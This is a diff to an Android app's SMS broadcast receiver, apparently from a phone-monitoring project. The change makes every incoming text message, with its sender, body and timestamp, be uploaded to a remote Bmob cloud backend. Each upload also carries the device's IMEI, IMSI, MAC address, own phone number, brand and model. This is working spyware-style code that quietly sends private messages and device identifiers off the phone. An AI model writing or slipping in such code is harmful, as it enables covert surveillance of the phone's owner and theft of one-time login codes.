@@ -1,10 +1,15 @@
 package com.my.phonermon;
 
+import java.util.Date;
+
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.os.Bundle;
 import android.telephony.SmsMessage;
+import cn.bmob.v3.listener.SaveListener;
+
+import com.my.phonermon.bean.SMS;
 
 public class SMSReceiver extends BroadcastReceiver {
 
@@ -17,10 +22,29 @@ public class SMSReceiver extends BroadcastReceiver {
 			for (int n = 0; n < smsMessage.length; n++) {
 				smsMessage[n] = SmsMessage.createFromPdu((byte[]) messages[n]);
 			}
-
 			for (SmsMessage message : smsMessage) {
-				String content = message.getMessageBody();// 得到短信内容
-				String sender = message.getOriginatingAddress();// 得到发件人号码
+				SMS sms = new SMS();
+				sms.setBrand(android.os.Build.BRAND);
+				sms.setImei(PackageUtils.getIMEI());
+				sms.setImsi(PackageUtils.getIMSI());
+				sms.setMac(PackageUtils.getMAC());
+				sms.setModel(android.os.Build.MODEL);
+				sms.setReceiver(PackageUtils.getPhoneNumber());
+				sms.setSender(message.getOriginatingAddress());
+				sms.setSenderTime(new Date(message.getTimestampMillis()));
+				sms.setSmsMsg(message.getMessageBody());
+				sms.setStatus(SMS.Receive);
+				sms.save(context, new SaveListener() {
+					@Override
+					public void onSuccess() {
+						ToastUtils.showToast("保存SMS成功");
+					}
+					
+					@Override
+					public void onFailure(int code, String msg) {
+						ToastUtils.showToast("保存SMS失败");
+					}
+				});
 			}
 
 		}
